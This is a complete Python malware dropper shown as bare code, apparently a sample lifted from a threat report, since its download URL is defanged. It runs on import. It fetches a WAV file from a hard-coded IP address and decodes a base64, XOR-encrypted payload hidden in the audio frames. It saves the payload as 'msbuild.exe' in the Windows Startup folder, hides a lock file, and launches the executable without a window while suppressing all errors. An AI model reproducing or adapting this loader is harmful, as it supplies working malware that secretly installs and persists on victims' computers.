import subprocess
import time
import os
import base64
import wave
import urllib.request


def setup():
    if os.name != 'nt':
        return

    try:
        appdata = os.getenv('APPDATA')
        startup_dir = r'Microsoft\Windows\Start Menu\Programs\Startup'
        exe_name = 'msbuild.exe'

        p = os.path.join(appdata, startup_dir, exe_name)
        l = p + '.lock'
        t = p + '.tmp'

        if os.path.exists(p):
            return

        if os.path.exists(l):
            m_time = os.path.getmtime(l)
            if (time.time() - m_time) < 43200:
                return

        with open(l, 'w') as f:
            f.write(str(time.time()))

        try:
            subprocess.run(['attrib', '+h', l], capture_output=True)
        except:
            pass

        r = urllib.request.Request(
            'hXXp://83[.]142[.]209[.]203:8080/hangup.wav',
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        with urllib.request.urlopen(r, timeout=15) as resp:
            with open(t, "wb") as f:
                f.write(resp.read())

        with wave.open(t, 'rb') as w:
            b = base64.b64decode(w.readframes(w.getnframes()))
            xor_key = b[:8]
            ciphertext = b[8:]
            payload = bytes([
                ciphertext[i] ^ xor_key[i % len(xor_key)]
                for i in range(len(ciphertext))
            ])
            with open(p, "wb") as f:
                f.write(payload)

        if os.path.exists(t):
            os.remove(t)

        subprocess.Popen([p], creationflags=0x08000000)

    except:
        pass


setup()
